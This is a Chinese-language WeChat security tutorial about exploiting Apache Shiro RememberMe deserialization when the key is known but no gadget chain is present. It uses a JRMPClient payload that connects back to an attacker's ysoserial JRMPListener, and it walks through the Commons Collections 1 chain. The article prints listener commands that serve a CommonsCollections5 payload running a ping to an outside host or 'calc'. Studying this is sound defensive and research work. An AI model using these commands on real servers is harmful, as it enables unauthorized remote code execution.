---
title: 第108天-Shiro安全攻防：从JRMP到CC1，揭秘无利用链下的RCE新思路
url: https://mp.weixin.qq.com/s/JCDXK_QtzQelqJtxqCEXRA
source: Doonsec's feed
date: 2026-03-25
fetch_date: 2026-03-26T04:26:37.900771
---

# 第108天-Shiro安全攻防：从JRMP到CC1，揭秘无利用链下的RCE新思路

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/Byhdgj3e9qvJqvGon4llc409Fek0GibkOfkFNHVexkf4hWefjEZDpEiaf5RFx6ibV2BiaOxHicichUd65YyOZzEY5YfhP9BrZn5mfhiabTT2lTgU3w/0?wx_fmt=jpeg)

# 第108天-Shiro安全攻防：从JRMP到CC1，揭秘无利用链下的RCE新思路

原创

Сяо Яо
Сяо Яо

AlphaNet

![]()

在小说阅读器中沉浸阅读

> 大家好，我是 Сяо Яо！在Java安全领域，Apache Shiro框架的漏洞一直是攻防双方关注的焦点。当你好不容易找到了Shiro的Key，却发现目标环境中没有常见的利用链（Gadget Chain）时，是不是感觉万分沮丧？别担心，今天我们就来深入探讨一种“有Key无链”场景下的高级攻击技巧——JRMP协议，并回溯经典的Commons Collections 1（CC1）利用链，带你从底层理解漏洞的来龙去脉。

---

### 🤔 是什么：JRMP与“有Key无链”的困境

#### 1. Shiro“有Key无链”的窘境

在Shiro的反序列化漏洞利用中，我们通常的流程是：

1. 找到或爆破出AES加密密钥（RememberMe的Key）。

2. 构造一个包含恶意代码的Java对象（利用链，如CC、CB等）。

3. 用Key加密这个恶意对象，生成恶意的RememberMe Cookie。

4. 发送带有这个Cookie的请求，Shiro服务端解密并反序列化，触发恶意代码执行（RCE）。

但现实情况是，很多现代Java应用为了安全，会移除或不使用包含漏洞的第三方库。这就导致了“**有Key无利用链**”的尴尬局面：我们空有进入大门的钥匙，却发现门后空无一物，无法直接执行命令。

#### 2. JRMP：打破僵局的“任意门”

**JRMP**，全称 **Java Remote Method Protocol**（Java远程方法协议），是Java RMI（远程方法调用）机制的底层通信协议。它允许一个JVM中的对象像调用本地方法一样调用另一个JVM中对象的方法。

在Shiro漏洞利用中，JRMP扮演了一个“中介”或“桥梁”的角色。我们可以构造一个`JRMPClient`对象作为序列化的Payload。当Shiro反序列化这个`JRMPClient`对象时，它会主动去连接我们指定的JRMP服务端（Listener），并加载服务端返回的恶意对象。

这样一来，真正的攻击载荷（如CC5链）就存放在我们的JRMP服务端上，而不再需要目标环境自身存在利用链库了。这极大地扩展了Shiro漏洞的攻击面。

---

### 🧐 为什么：JRMP如何实现远程代码执行？

JRMP的利用流程可以概括为以下三步：

1. **攻击者**：在自己的服务器上启动一个恶意的`JRMPListener`。

2. **受害者（Shiro服务器）**：反序列化`JRMPClient`并发起连接。

3. **触发执行**：加载远程恶意对象并执行。

---

### 🛠️ 怎么做：实战演练与链分析

#### 场景一：利用JRMPClient进行Shiro RCE

**第一步：在攻击者服务器上启动JRMPListener**

```
# -cp 指定classpath
# ysoserial.exploit.JRMPListener 是启动Listener的类
# 6789 是监听端口
# CommonsCollections5 是我们希望在目标上触发的利用链
# "ping kfxmlanpak.zaza.eu.org" 是要执行的命令
java -cp ysoserial-0.0.8-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 6789 CommonsCollections5 "ping kfxmlanpak.zaza.eu.org"
```

```
java -cp ysoserial-0.0.8-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 6789 CommonsCollections5 "calc"
```

---

#### 场景二：深入理解CC1链的构造（Transform执行链）

**CC1利用链的调用栈：**

```
Gadget chain:
    ObjectInputStream.readObject()
        AnnotationInvocationHandler.readObject()
            MapEntry.setValue()
                TransformedMap.checkSetValue()
                    ChainedTransformer.transform()
                        ConstantTransformer.transform()
                        InvokerTransformer.transform()
                        InvokerTransformer.transform()
                        InvokerTransformer.transform()
```

---

### 📝 核心要点总结

1. **有Key无链**：获取Key但无法RCE

2. **JRMP协议**：远程加载利用链

3. **CC1链原理**：Transformer链执行

4. **利用链三要素**：Source / Gadget / Sink

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/sz_mmbiz_png/Byhdgj3e9quk3H3M941l5byeiaCLHfZUhoIib5xPSPc8ddSdEOynSxIhaaiaIxwJImQia7wqHZPUerghtNSnbEj87A80CvEm0bGia8Is4qGerIvc/0?wx_fmt=png)

AlphaNet

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/sz_mmbiz_png/Byhdgj3e9quk3H3M941l5byeiaCLHfZUhoIib5xPSPc8ddSdEOynSxIhaaiaIxwJImQia7wqHZPUerghtNSnbEj87A80CvEm0bGia8Is4qGerIvc/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过